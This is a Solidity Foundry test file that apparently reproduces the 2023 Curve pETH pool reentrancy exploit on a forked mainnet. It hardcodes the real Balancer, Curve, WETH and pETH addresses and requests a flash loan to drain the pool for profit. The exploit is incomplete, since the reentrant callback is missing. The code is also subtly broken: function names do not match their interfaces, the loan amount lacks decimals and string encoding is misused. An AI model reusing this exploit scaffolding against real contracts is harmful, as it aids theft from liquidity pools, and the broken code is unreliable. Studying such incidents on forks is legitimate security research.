// SPDX-License-Idendifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

interface IWETH is IERC20 {
    function deposit() external payable;// this funtion is to deposit WETH to the contract
    function withdraw(uint256 amount) external;// this function is not payable
    


}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface ICurvePool {
    function get_balance() external view returns  (uint256[2] memory); // this is to get the balance of the pool
    function exchange(
        int128 i,
        int128 j,
        uint256 dx,
        uint256 min_dy
    ) external payable returns (uint256); // this function is to exchange the tokens from the pool

    function add_liquidity(
        uint256[2] memory accounts,
        uint256  min_mint_amount
    ) external payable returns (uint256); // this function is to add liquidity to the pool

    function remove_liquidity(
        uint256 token_amount,
        uint256[2]  memory min_amounts
    ) external ; // this is the function that will remove liquidity from the general pool


}

// the WETH  interface simply an execution of the IERC20 wher it adds the deposit and the withdraw(amount ) function to go frome ETH to WETH and back, 
// this is needed because we will requise WETH from Balancer and need to convert it to ETH  and vice versa

// the BalancerVault interface exposes a single function  flashloan which we weill use to request a massinve flash loan from Balancer to conduch the exploit

// the curve pool interface exposes functions from the Curve Pool contract that will let us add and remove liquidity , swap tokens , and fetch the balance of tokes in the pool at a given point.




contract CurveHack is Test {
    IBalancerVault BalancerVault =
        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    ICurvePool CurvePool =
        ICurvePool(0x9848482da3Ee3076165ce6497eDA906E66bB85C5);
    IWETH WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IERC20 pETH = IERC20(0x836A808d4828586A69364065A1e064609F5078c7);
    IERC20 LPToken = IERC20(0x9848482da3Ee3076165ce6497eDA906E66bB85C5);

    bool addLiquidityInReentrancy = true;

    /*
    NOTE 

    the LPToken and CurvePool contract addreses are the same because the CurvePoole is also an ERC20 contract
    and is rensposible for minting the LP Tokens to liquidity  providers as well we just treat them separately for better readability

    the boolean that has been set in the state variable is to check out reentrancy if it has been executed
    It will let us know whether we are in reentrancy or not and if we have the chance to re-enter the Curve Pool twice 



    */

    function setUp() public {
        vm.createSelectFork("mainnet", 17_806_055);
        // this function is just setting up the testing environment and let foundry knw we want to work on a forked version on the mainnet
        // vm cheat code will tell foundry to fork off mainned and we earlier provided an RPC URL  for mainnet in the foundry.toml file 
        // the second argument tells the block number to fork off from , and block number is one from right before the expoint happened , so we can reacreate the situation .


    }

    // lets create a helper function to pront a variety of values to out terminal console when running out test 

    // this will let us inspect the changes that are happening and help with understanding the frol of the attack

    function logValues(string memory key) internal {
        emit log_named_decimal_uint(
            string(abi.encode(key, ": Curve LP Total Supply")),
            LPToken.totalSupply(),
            LPToken.decimals()

        );// this emmit will get all the total supply of LP TOKENS

        emit log_named_decimal_uint(
            string(abi.encode(key, ": Curve ETH Balance")),
            CurvePool.get_balances()[0],
            18
        ); // this emit will get us all the balances in ETH  of the curve pool


        emit log_named_decimal_uint(
            string(abi.encode(key, ": Curve pETH Balance")),
            CurvePool.get_balances()[1],
            pETH.decimals()
        );// this emit will get us all the balances in pETH of the curve pool   

        emit log_named_decimal_uint(
            string(abi.encode(key, ": Attacker LP Balance")),
            LPToken.balanceOf(address(this)),
            LPToken.decimals()
        ); // this will get us all the balances in LP TOKENS of the attacker

        emit log_named_decimal_uint(
            string(abi.encode(key, ": Attacker ETH Balance")),
            address(this).balance,
            18
        ); // this will give us the balance of the attacker in ETH

        emit log_named_decimal_uint(
            string(abi.encode(key, ": Attacker pETH Balance")),
            pETH.balanceOf(address(this)),
            pETH.decimals()
        );// this emit will give use the balance of the attacker in pETH 
        
        emit 
        log("============================================");


    }// this function will print values in the terminal using the log_named_decimal_uint that foundry understands and interprates as an equivalend to trying to console.log a uint256 value 


    function  testHack() external {
        // foundry-specific function to reset ETH balance of this contract to 0
        deal(address(this),0);


        // tell the balancer we need 100000 weth from them 

        address[] memory tokens = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = address(WETH);
        amounts[0] = 100000;


        // request theflash loan 
        // this function call wil also call 'recieveFlashLoan'

        BalancerVault.flashloan(address(this), tokens, amounts, "");

        // by the time the above code will run and returns the flash loan , the balance of the pool should be 0 this means that it will be paid in full

        // the exploit will be complete 
        // we can now see how much  ETH  we still have left with , which is pure profits

        emit log_named_decimal_uint(
            "ETH in profits: ", 
            address(this).balance,
            18
        );


    }

    

}